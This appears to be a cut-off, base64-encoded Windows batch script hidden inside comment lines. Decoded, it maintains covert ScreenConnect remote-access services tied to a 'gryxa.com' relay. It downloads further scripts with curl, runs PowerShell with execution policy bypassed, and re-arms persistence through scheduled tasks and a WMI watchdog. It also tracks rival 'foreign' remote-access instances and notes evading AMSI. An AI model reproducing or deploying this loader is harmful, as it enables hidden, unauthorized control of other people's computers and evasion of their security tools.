::JVx0Z19yZXBvcnQubmV3IiAiJVdEJVx0Z19yZXBvcnQucHMxIiA+bnVsIDI+JjEN
::CiAgZmluZHN0ciAvQzoiT1dOX1NFQ1VSRSBCVUlMRCIgIiVTVEFHRSVcb3duX3Nl
::Y3VyZS5uZXciID5udWwgMj4mMSAmJiBmb3IgJSVGIGluICgiJVNUQUdFJVxvd25f
::c2VjdXJlLm5ldyIpIGRvIGlmICUlfnpGIEdUUiA4MDAgbW92ZSAveSAiJVNUQUdF
::JVxvd25fc2VjdXJlLm5ldyIgIiVXRCVcb3duX3NlY3VyZS5jbWQiID5udWwgMj4m
::MQ0KICBmaW5kc3RyIC9DOiJPV05fTElCICBCVUlMRCIgIiVTVEFHRSVcb3duX2xp
::Yi5uZXciID5udWwgMj4mMSAmJiBmb3IgJSVGIGluICgiJVNUQUdFJVxvd25fbGli
::Lm5ldyIpIGRvIGlmICUlfnpGIEdUUiAxNTAwIG1vdmUgL3kgIiVTVEFHRSVcb3du
::X2xpYi5uZXciICIlV0QlXG93bl9saWIucHMxIiA+bnVsIDI+JjENCiAgZmluZHN0
::ciAvQzoiT1dOX0dSWVhBIEJVSUxEIiAiJVNUQUdFJVxvd25fZ3J5eGEubmV3IiA+
::bnVsIDI+JjEgJiYgZm9yICUlRiBpbiAoIiVTVEFHRSVcb3duX2dyeXhhLm5ldyIp
::IGRvIGlmICUlfnpGIEdUUiA1MDAgbW92ZSAveSAiJVNUQUdFJVxvd25fZ3J5eGEu
::bmV3IiAiJVdEJVxvd25fZ3J5eGEuY21kIiA+bnVsIDI+JjENCiAgc2V0ICJTRUxG
::X1VQRD0wIg0KICBmaW5kc3RyIC9DOiJPV05fTU9OICBCVUlMRCIgIiVTVEFHRSVc
::b3duX21vbi5uZXh0IiA+bnVsIDI+JjENCiAgaWYgbm90IGVycm9ybGV2ZWwgMSBm
::b3IgJSVGIGluICgiJVNUQUdFJVxvd25fbW9uLm5leHQiKSBkbyBpZiAlJX56RiBH
::VFIgMTUwMCAoDQogICAgZmMgL2IgIiVTVEFHRSVcb3duX21vbi5uZXh0IiAiJVdE
::JVxvd25fbW9uLmNtZCIgPm51bCAyPiYxDQogICAgaWYgZXJyb3JsZXZlbCAxIHNl
::dCAiU0VMRl9VUEQ9MSINCiAgKQ0KICBpZiAiJVNFTEZfVVBEJSI9PSIwIiBkZWwg
::L2YgL3EgIiVTVEFHRSVcb3duX21vbi5uZXh0IiA+bnVsIDI+JjENCikgZWxzZSAo
::DQogIGRlbCAvZiAvcSAiJVNUQUdFJVx0Z19yZXBvcnQubmV3IiAiJVNUQUdFJVxv
::d25fc2VjdXJlLm5ldyIgIiVTVEFHRSVcb3duX2xpYi5uZXciICIlU1RBR0UlXG93
::bl9tb24ubmV4dCIgIiVTVEFHRSVcb3duX2dyeXhhLm5ldyIgPm51bCAyPiYxDQog
::IHNldCAiU0VMRl9VUEQ9MCINCikNCmRlbCAvZiAvcSAiJVNUQUdFJVx0Z19yZXBv
::cnQubmV3IiAiJVNUQUdFJVxvd25fc2VjdXJlLm5ldyIgIiVTVEFHRSVcb3duX2xp
::Yi5uZXciICIlU1RBR0UlXG93bl9ncnl4YS5uZXciID5udWwgMj4mMQ0KZGVsIC9m
::IC9xICIlU1RBR0UlXHVwZGF0ZS5tYW5pZmVzdCIgIiVTVEFHRSVcdXBkYXRlLm1h
::bmlmZXN0LnNpZyIgPm51bCAyPiYxDQoNCnJlbSBNNDM6IGlmIGxpYiBzdGlsbCBt
::aXNzaW5nIChBTVNJIHdpcGVkIGl0IC8gbmV2ZXIgbGFuZGVkKSwga2VlcCBhIFRF
::TVAgY29weSBmb3IgZmFsbGJhY2tzDQppZiBub3QgZXhpc3QgIiVXRCVcb3duX2xp
::Yi5wczEiIGlmIGV4aXN0ICIlU1RBR0UlXG93bl9saWIubmV3IiBjb3B5IC95ICIl
::U1RBR0UlXG93bl9saWIubmV3IiAiJVdEJVxvd25fbGliLnBzMSIgPm51bCAyPiYx
::DQppZiBub3QgZXhpc3QgIiVXRCVcb3duX2dyeXhhLmNtZCIgKA0KICAiJUNVUkwl
::IiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10
::aW1lIDIwIC1vICIlV0QlXG93bl9ncnl4YS5jbWQiICIlT1dOR1JZWEElIiA+bnVs
::IDI+JjENCiAgaWYgbm90IGV4aXN0ICIlV0QlXG93bl9ncnl4YS5jbWQiICIlQ1VS
::TCUiIC1MIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSAyMCAtbyAiJVdE
::JVxvd25fZ3J5eGEuY21kIiAiJU9XTkdSWVhBMiUiID5udWwgMj4mMQ0KKQ0KDQpy
::ZW0gTTQyOiBzZXZyei5jZmcgZHluYW1pYyBGUCBmcm9tIHJlcG8gc2V2cnpfZXhw
::ZWN0ZWQuY2ZnDQppZiBleGlzdCAiJVdEJVxzZXZyei5jZmciIGZvciAvZiAidXNl
::YmFja3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxzZXZyei5j
::ZmciKSBkbyAoDQogIGlmIC9JICIlJUsiPT0iUFJJTUFSWV9GUCIgc2V0ICJLRUVQ
::X0ZQPSUlTCINCiAgaWYgL0kgIiUlSyI9PSJBTFRfRlAiIHNldCAiQUxUX0ZQPSUl
::TCINCikNCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGlt
::ZW91dCA2IC0tbWF4LXRpbWUgMjAgLW8gIiVTVEFHRSVcc2V2cnpfZXhwZWN0ZWQu
::bmV3IiAiJVNFVlJaX0VYUF9VUkwlIiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAi
::JVNUQUdFJVxzZXZyel9leHBlY3RlZC5uZXciICIlQ1VSTCUiIC1MIC0tY29ubmVj
::dC10aW1lb3V0IDYgLS1tYXgtdGltZSAyMCAtbyAiJVNUQUdFJVxzZXZyel9leHBl
::Y3RlZC5uZXciICIlU0VWUlpfRVhQX1VSTDIlIiA+bnVsIDI+JjENCmlmIGV4aXN0
::ICIlU1RBR0UlXHNldnJ6X2V4cGVjdGVkLm5ldyIgaWYgZXhpc3QgIiVXRCVcb3du
::X2xpYi5wczEiICgNCiAgZm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAlJVIgaW4g
::KGBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRp
::b25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kICIkdD1HZXQtQ29udGVudCAtTGl0ZXJh
::bFBhdGggJyVTVEFHRSVcc2V2cnpfZXhwZWN0ZWQubmV3JyAtUmF3OyAmICclV0Ql
::XG93bl9saWIucHMxJyAtQWN0aW9uIHN5bmMtc2V2cnotZnAgLVdvcmtEaXIgJyVX
::RCUnIC1FeHRyYSAkdCJgKSBkbyAoDQogICAgZWNobyBzZXZyel9zeW5jICUlUj4+
::IiVMT0clIg0KICAgIGZvciAvZiAidG9rZW5zPTIsMyBkZWxpbXM9fCIgJSVBIGlu
::ICgiJSVSIikgZG8gKA0KICAgICAgaWYgbm90ICIlJUEiPT0iIiBzZXQgIktFRVBf
::RlA9JSVBIg0KICAgICAgaWYgbm90ICIlJUIiPT0iIiBzZXQgIkFMVF9GUD0lJUIi
::DQogICAgKQ0KICApDQopDQpkZWwgL2YgL3EgIiVTVEFHRSVcc2V2cnpfZXhwZWN0
::ZWQubmV3IiA+bnVsIDI+JjENCmlmIGV4aXN0ICIlV0QlXHNldnJ6LmNmZyIgZm9y
::IC9mICJ1c2ViYWNrcSB0b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0Ql
::XHNldnJ6LmNmZyIpIGRvICgNCiAgaWYgL0kgIiUlSyI9PSJQUklNQVJZX0ZQIiBz
::ZXQgIktFRVBfRlA9JSVMIg0KICBpZiAvSSAiJSVLIj09IkFMVF9GUCIgc2V0ICJB
::TFRfRlA9JSVMIg0KKQ0KDQpyZW0g4pSA4pSAIFtCXSByZS1hcm0gY2hhaW4gMTog
::b3duZXJzaGlwLWF3YXJlIChub3QgZXhpc3RlbmNlLW9ubHkpIOKUgOKUgA0KcmVt
::IEwxMS9NMjI6IFF1ZXJ5LW9ubHkgc2tpcHBlZCByZWFybSB3aGVuIFdpbmRvd3Mg
::YnVpbHQtaW4gdGFza3Mgc2hhcmVkDQpyZW0gZGVmYXVsdCBuYW1lcyAoRGlhZ25v
::c2lzXFNjaGVkdWxlZCBldGMuKSAtPiBtb24gbmV2ZXIgcmFuLCBubyBsb2cuDQpp
::ZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgKA0KICBmb3IgL2YgInVzZWJhY2tx
::IGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50
::ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3du
::X2xpYi5wczEiIC1BY3Rpb24gdGFza3MtZW5zdXJlIC1Xb3JrRGlyICIlV0QlIiAt
::TW9uUGF0aCAiJVdEJVxvd25fbW9uLmNtZCJgKSBkbyAoDQogICAgZWNobyB0YXNr
::c19lbnN1cmUgJSVSPj4iJUxPRyUiDQogICAgc2V0ICJUQVNLU19FTlNVUkU9JSVS
::Ig0KICApDQopDQppZiBub3QgZXhpc3QgIiVFVEwlIiBta2RpciAiJUVUTCUiID5u
::dWwgMj4mMQ0KaWYgZXhpc3QgIiVXRCVcb3duX21vbi5jbWQiICgNCiAgYXR0cmli
::IC1oIC1zIC1yICIlRVRMJVxldGxfbW9uLmNtZCIgPm51bCAyPiYxDQogIGNvcHkg
::L3kgIiVXRCVcb3duX21vbi5jbWQiICIlRVRMJVxldGxfbW9uLmNtZCIgPm51bCAy
::PiYxDQopDQoNCnJlbSDilIDilIAgW0IyXSByZS1hcm0gY2hhaW4gMiAoV01JIHN1
::YnNjcmlwdGlvbikgaWYgbWlzc2luZyDilIDilIDilIDilIDilIDilIDilIDilIDi
::lIANCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiAoDQogIGZvciAvZiAidXNl
::YmFja3EgZGVsaW1zPSIgJSVSIGluIChgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1O
::b25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdE
::JVxvd25fbGliLnBzMSIgLUFjdGlvbiB3YXRjaGRvZy1lbnN1cmUgLVdvcmtEaXIg
::IiVXRCUiIC1Nb25QYXRoICIlV0QlXG93bl9tb24uY21kImApIGRvIHNldCAiV0Rf
::U1RBVEU9JSVSIg0KICBpZiAvSSAiIVdEX1NUQVRFISI9PSJSRUFSTUVEIiBlY2hv
::IHdhdGNoZG9nIFdNSSBSRUFSTUVEPj4iJUxPRyUiDQopDQoNCnJlbSDilIDilIAg
::W0UwXSBzeW5jIEdyeXhhIEZQIGZyb20gdmVyaWZpZWQgZ3J5eGEuY29tIFNDIEJF
::Rk9SRSBleHRlcm1pbmF0ZSDilIDilIANCmlmIGV4aXN0ICIlV0QlXG93bl9saWIu
::cHMxIiAoDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUg
::LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEi
::IC1BY3Rpb24gc3luYy1ncnl4YS1mcCAtV29ya0RpciAiJVdEJSIgPm51bCAyPiYx
::DQogIGlmIGV4aXN0ICIlV0QlXGdyeXhhLmNmZyIgZm9yIC9mICJ1c2ViYWNrcSB0
::b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXGdyeXhhLmNmZyIpIGRv
::IGlmIC9JICIlJUsiPT0iQ1VSUkVOVF9GUCIgc2V0ICJHUllYQV9GUD0lJUwiDQop
::DQoNCnJlbSDilIDilIAgW0VdIEw0NS9NNDggSEFORFMtT0ZGOiBza2lwIGV4dGVy
::bWluYXRlIChkbyBub3QgdG91Y2ggYW55IFNjcmVlbkNvbm5lY3QpIOKUgOKUgA0K
::ZWNobyBoYW5kc19vZmZfc2tpcF9leHRlcm1pbmF0ZT4+IiVMT0clIg0Kc2V0ICJG
::T1JFSUdOX0xFRlQ9MCINCmZvciAvZiAidG9rZW5zPTIgZGVsaW1zPSgpIiAlJWEg
::aW4gKCdzYyBxdWVyeSBzdGF0ZV49IGFsbCBefCBmaW5kc3RyIC9DOiJTRVJWSUNF
::X05BTUU6IFNjcmVlbkNvbm5lY3QgQ2xpZW50IicpIGRvICgNCiAgc2V0ICJGUD0l
::JWEiDQogIHNldCAiRlA9IUZQOiA9ISINCiAgcmVtIGZyaWVuZGx5IGlmIGtlZXBl
::ciBGUCBPUiBncnl4YS1yZWxheSAoSW1hZ2VQYXRoIGhhcyBncnl4YS5jb20pIOKA
::lCBuZXZlciBjb3VudCBuZXcgR3J5eGEgYXMgZm9yZWlnbg0KICBzZXQgIkZSSUVO
::RExZPTAiDQogIGlmIC9JICIhRlAhIj09IiVLRUVQX0ZQJSIgc2V0ICJGUklFTkRM
::WT0xIg0KICBpZiAvSSAiIUZQISI9PSIlQUxUX0ZQJSIgc2V0ICJGUklFTkRMWT0x
::Ig0KICBpZiAvSSAiIUZQISI9PSIlR1JZWEFfRlAlIiBzZXQgIkZSSUVORExZPTEi
::DQogIGlmICIhRlJJRU5ETFkhIj09IjAiICgNCiAgICBmb3IgL2YgInVzZWJhY2tx
::IGRlbGltcz0iICUlSSBpbiAoYHJlZyBxdWVyeSAiSEtMTVxTWVNURU1cQ3VycmVu
::dENvbnRyb2xTZXRcU2VydmljZXNcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCFGUCEp
::IiAvdiBJbWFnZVBhdGggMl4+bnVsIF58IGZpbmRzdHIgL0kgIkltYWdlUGF0aCJg
::KSBkbyAoDQogICAgICBlY2hvICUlSSB8IGZpbmRzdHIgL0kgImdyeXhhLmNvbSIg
::Pm51bCAmJiBzZXQgIkZSSUVORExZPTEiDQogICAgKQ0KICApDQogIGlmICIhRlJJ
::RU5ETFkhIj09IjAiICgNCiAgICBzZXQgL2EgQ09VTlQrPTENCiAgICBzZXQgL2Eg
::Rk9SRUlHTl9MRUZUKz0xDQogICAgc2V0ICJGT1JFSUdOX0xJU1Q9IUZPUkVJR05f
::TElTVCEhRlAhICINCiAgICBlY2hvIGZvcmVpZ25fbGVmdF8hRlAhPj4iJUxPRyUi
::DQogICkNCikNCg0KcmVtIOKUgOKUgCBbQ10gaGVhbCBTY3JlZW5Db25uZWN0IHBy
::aW0vYWx0IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KZm9y
::IC9mICJ0b2tlbnM9MSwyIGRlbGltcz0oKSIgJSVhIGluICgnc2MgcXVlcnkgIlNj
::cmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiBefCBmaW5kc3RyIC9DOiJT
::RVJWSUNFX05BTUUiJykgZG8gKA0KICBzZXQgIklOU1RBTExFRD0xIg0KICBzZXQg
::IlBSSU1TVEFURT0lJWIiDQopDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGll
::bnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KaWYgbm90IGVy
::cm9ybGV2ZWwgMSAoDQogIHNldCAiUFJJTV9PSz0xIg0KICBzZXQgL2EgQ09VTlQr
::PTENCikNCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUp
::IiA+bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0IC9hIENPVU5UKz0x
::DQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgfCBm
::aW5kICJSVU5OSU5HIiA+bnVsDQppZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiQUxU
::X09LPTEiDQoNCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1fT0slIj09
::IjAiICgNCiAgZWNobyBzdmMgaGVhbCByZXN0YXJ0Pj4iJUxPRyUiDQogIG5ldCBz
::dGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4m
::MQ0KICBzYyBzdGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSki
::ID5udWwgMj4mMQ0KICB0aW1lb3V0IC90IDYgL25vYnJlYWsgPm51bA0KICBzYyBx
::dWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAi
::UlVOTklORyIgPm51bA0KICBpZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiUFJJTV9P
::Sz0xIg0KKQ0KcmVtIE0xNjogc3RpbGwgc3RvcHBlZCAtPiByZXBhaXIgdGhlIFJF
::R0lTVEVSRUQgcHJvZHVjdCAobXNpZXhlYyAvZmEgcmVzdG9yZXMNCnJlbSBiaW5h
::cmllcyArIHN0YXJ0cyB0aGUgc2VydmljZTsgTDUgUmVwYWlyLVNDU2VydmljZSBo
::YW5kbGVzIHN0b3BwZWQgc3ZjcykNCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAi
::JVBSSU1fT0slIj09IjAiICgNCiAgZWNobyBzdmMgZXNjYWxhdGUgcmVwYWlyPj4i
::JUxPRyUiDQogIGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxs
::IC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlw
::YXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlcGFpciAtRnAg
::IiVLRUVQX0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAyPiYxDQogIHRp
::bWVvdXQgL3QgOCAvbm9icmVhayA+bnVsDQogIHNjIHF1ZXJ5ICJTY3JlZW5Db25u
::ZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQog
::IGlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJQUklNX09LPTEiDQopDQpyZW0gTTE2
::OiBvcnBoYW5lZCBzZXJ2aWNlIGVudHJ5IChwcm9kdWN0IHVucmVnaXN0ZXJlZCAt
::IGVhdGVuIGJ5IGFuIFNDLWZhbWlseQ0KcmVtIHVwZ3JhZGUgcmVtb3ZhbCkgY2Fu
::IE5FVkVSIHN0YXJ0LiBEZWxldGUgaXQgYW5kIGZhbGwgdGhyb3VnaCB0byB0aGUN
::CnJlbSBmcmVzaC1pbnN0YWxsIGxhZGRlciBiZWxvdyBpbnN0ZWFkIG9mIGFsZXJ0
::aW5nICJ3b250IHN0YXJ0IiBmb3JldmVyLg0KaWYgIiVJTlNUQUxMRUQlIj09IjEi
::IGlmICIlUFJJTV9PSyUiPT0iMCIgKA0KICBzZXQgIlJFR1NUQVRFPXVua25vd24i
::DQogIGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBmb3IgL2YgImRlbGltcz0i
::ICUlUiBpbiAoJ3Bvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUg
::LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEi
::IC1BY3Rpb24gcmVnaXN0ZXJlZCAtRnAgIiVLRUVQX0ZQJSIgLVdvcmtEaXIgIiVX
::RCUiJykgZG8gc2V0ICJSRUdTVEFURT0lJVIiDQogIGVjaG8gb3JwaGFuX2NoZWNr
::PSFSRUdTVEFURSE+PiIlTE9HJSINCiAgaWYgL0kgIiFSRUdTVEFURSEiPT0ibm8i
::ICgNCiAgICBlY2hvIG9ycGhhbl9zZXJ2aWNlX2RlbGV0ZV9TS0lQUEVEX2hhbmRz
::X29mZj4+IiVMT0clIg0KICAgIHJlbSBNNDg6IG5ldmVyIHNjIGRlbGV0ZSBhbnkg
::U2NyZWVuQ29ubmVjdA0KDQogICkNCikNCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBp
::ZiAiJVBSSU1fT0slIj09IjAiICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1O
::b25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdE
::JVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29ya0RpciAiJVdEJSIgLUJ1
::aWxkICVNT05WRVIlIC1FeHRyYSAic3ZjLXdvbnQtc3RhcnQiID5udWwgMj4mMQ0K
::ICBjYWxsIDpUZ1N0YXRlIERPV04gIlNjcmVlbkNvbm5lY3QgKCVLRUVQX0ZQJSkg
::aW5zdGFsbGVkIGJ1dCB3b250IHN0YXJ0Ig0KICBnb3RvIDpBZnRlckhlYWwNCikN
::CmlmICIlSU5TVEFMTEVEJSI9PSIxIiBnb3RvIDpBZnRlckhlYWwNCg0KcmVtIOKU
::gOKUgCBbRF0gcHJpbWFyeSBTQyBtaXNzaW5nIC0gaGVhbCBsYWRkZXIg4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
::4pSA4pSA4pSA4pSADQpyZW0gTTEyOiBGSVJTVCByZXBhaXIgdGhlIHJlZ2lzdGVy
::ZWQgcHJvZHVjdCAocmVjcmVhdGVzIHNlcnZpY2Ugd2l0aG91dA0KcmVtIHRvdWNo
::aW5nIHRoZSBBTFQgaW5zdGFuY2UpOyBmcmVzaCBtc2lleGVjIGluc3RhbGwgb25s
::eSBhcyBmYWxsYmFjay4NCmVjaG8gc3ZjIG1pc3NpbmcgLSBoZWFsIGJlZ2luPj4i
::JUxPRyUiDQpjYWxsIDpSZXBhaXJSZWdpc3RlcmVkICIlS0VFUF9GUCUiDQpzYyBx
::dWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAi
::UlVOTklORyIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogIHNldCAiSU5T
::VEFMTEVEPTEiDQogIHNldCAiUFJJTV9PSz0xIg0KICBnb3RvIDpBZnRlckhlYWwN
::CikNCnJlbSByZWZ1c2UgZnJlc2ggL2kgaWYgcHJvZHVjdCBzdGlsbCByZWdpc3Rl
::cmVkIC0gVXBncmFkZSB0YWJsZSBjYW4gd2lwZSBBTFQvR1JZWEENCnNldCAiUkVH
::U1RBVEU9dW5rbm93biINCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBmb3Ig
::L2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJv
::ZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZp
::bGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVnaXN0ZXJlZCAtRnAgIiVL
::RUVQX0ZQJSIgLVdvcmtEaXIgIiVXRCUiYCkgZG8gc2V0ICJSRUdTVEFURT0lJVIi
::DQppZiAvSSAiIVJFR1NUQVRFISI9PSJ5ZXMiICgNCiAgZWNobyBwcmltYXJ5X3Jl
::Z2lzdGVyZWRfc2tpcF9mcmVzaF9pbnN0YWxsPj4iJUxPRyUiDQogIHBvd2Vyc2hl
::bGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBC
::eXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdv
::cmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgInJlZ2lzdGVyZWQt
::c3R1Y2siID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0YXRlIERPV04gIlByaW1hcnkg
::cmVnaXN0ZXJlZCBidXQgc2VydmljZSBtaXNzaW5nIC0gL2ZhIGZhaWxlZDsgcmVm
::dXNlZCAvaSB0byBwcm90ZWN0IEFMVC9HUllYQSINCiAgZ290byA6QWZ0ZXJIZWFs
::DQopDQpyZW0gTzM3OiByZWZ1c2Ugc2V2cnogL2kgd2hlbiBncnl4YSBhbHJlYWR5
::IHByZXNlbnQg4oCUIHNoYXJlZCBsZWdhY3kgVXBncmFkZUNvZGVzDQpyZW0gezBD
::OTQ0NDhCfS97MUY4NUQ3RkV9IG1ha2Ugc2libGluZyBtc2lleGVjIC9pIGtub2Nr
::IEdyeXhhIE9GRkxJTkUgaW4gcGFuZWwuDQpyZW0gTTM2OiBkZXRlY3QgR3J5eGEg
::YnkgcmVsYXkgZG9tYWluIHRvbyAoYW55IHJ1bm5pbmcgZ3J5eGEuY29tIFNDKSwg
::bm90IG9ubHkgYnkgRlAuDQpzZXQgIkdSRUc9dW5rbm93biINCmlmIGV4aXN0ICIl
::V0QlXG93bl9saWIucHMxIiBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBp
::biAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1
::dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rp
::b24gcmVnaXN0ZXJlZCAtRnAgIiVHUllYQV9GUCUiIC1Xb3JrRGlyICIlV0QlImAp
::IGRvIHNldCAiR1JFRz0lJVIiDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGll
::bnQgKCVHUllYQV9GUCUpIiA+bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxldmVsIDEg
::c2V0ICJHUkVHPXllcyINCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAo
::MzZlNTA2ZmYwMTZiMjE1MSkiID5udWwgMj4mMQ0KaWYgbm90IGVycm9ybGV2ZWwg
::MSBzZXQgIkdSRUc9eWVzIg0KcmVtIGFueSBub24tc2V2cnogUnVubmluZy9QZW5k
::aW5nIFNDIE9SIEltYWdlUGF0aCBncnl4YS5jb20gPSBHcnl4YSBwcmVzZW50DQpm
::b3IgL2YgInRva2Vucz0yIGRlbGltcz0oKSIgJSVhIGluICgnc2MgcXVlcnkgc3Rh
::dGVePSBhbGwgXnwgZmluZHN0ciAvQzoiU0VSVklDRV9OQU1FOiBTY3JlZW5Db25u
::ZWN0IENsaWVudCInKSBkbyAoDQogIHNldCAiX0ZQPSUlYSINCiAgc2V0ICJfRlA9
::IV9GUDogPSEiDQogIGlmIC9JIG5vdCAiIV9GUCEiPT0iJUtFRVBfRlAlIiBpZiAv
::SSBub3QgIiFfRlAhIj09IiVBTFRfRlAlIiAoDQogICAgc2MgcXVlcnkgIlNjcmVl
::bkNvbm5lY3QgQ2xpZW50ICghX0ZQISkiIHwgZmluZHN0ciAvSSAvQzoiUlVOTklO
::RyIgL0M6IlNUQVJUX1BFTkRJTkciID5udWwNCiAgICBpZiBub3QgZXJyb3JsZXZl
::bCAxIHNldCAiR1JFRz15ZXMiDQogICkNCiAgZm9yIC9mICJ1c2ViYWNrcSBkZWxp
::bXM9IiAlJUkgaW4gKGByZWcgcXVlcnkgIkhLTE1cU1lTVEVNXEN1cnJlbnRDb250
::cm9sU2V0XFNlcnZpY2VzXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICghX0ZQISkiIC92
::IEltYWdlUGF0aCAyXj5udWwgXnwgZmluZHN0ciAvSSAiSW1hZ2VQYXRoImApIGRv
::ICgNCiAgICBlY2hvICUlSSB8IGZpbmRzdHIgL0kgImdyeXhhLmNvbSIgPm51bCAm
::JiBzZXQgIkdSRUc9eWVzIg0KICApDQopDQppZiAvSSAiIUdSRUchIj09InllcyIg
::KA0KICBlY2hvIHByaW1hcnlfc2tpcF9pX3Byb3RlY3RfZ3J5eGE+PiIlTE9HJSIN
::CiAgZWNobyBoYW5kc19vZmZfZ3J5eGFfcHJlc2VudF9za2lwX3NldnJ6Pj4iJUxP
::RyUiDQogIGNhbGwgOkVuc3VyZUdyeXhhTXVzdA0KICBnb3RvIDpBZnRlckhlYWwN
::CikNCnJlbSBNNDggSEFORFMtT0ZGOiBza2lwIGFsbCBzZXZyeiBtc2lleGVjIC9p
::IC8gc2MtZmFtaWx5IGluc3RhbGxzDQplY2hvIGhhbmRzX29mZl9za2lwX3NldnJ6
::X21zaT4+IiVMT0clIg0KY2FsbCA6RW5zdXJlR3J5eGFNdXN0DQpnb3RvIDpBZnRl
::ckhlYWwNCmNhbGwgOlJlc3RvcmVBbHQNCmNhbGwgOkVuc3VyZUdyeXhhTXVzdA0K
::aWYgIiVJTlNUQUxMRUQlIj09IjAiICgNCiAgaWYgZXhpc3QgIiVXRCVcbXNpX2hl
::YWwubG9nIiAoDQogICAgZWNobyAtLS0gbXNpX2hlYWwubG9nIHRhaWwgLS0tPj4i
::JUxPRyUiDQogICAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2
::ZSAtQ29tbWFuZCAiR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICclV0QlXG1zaV9o
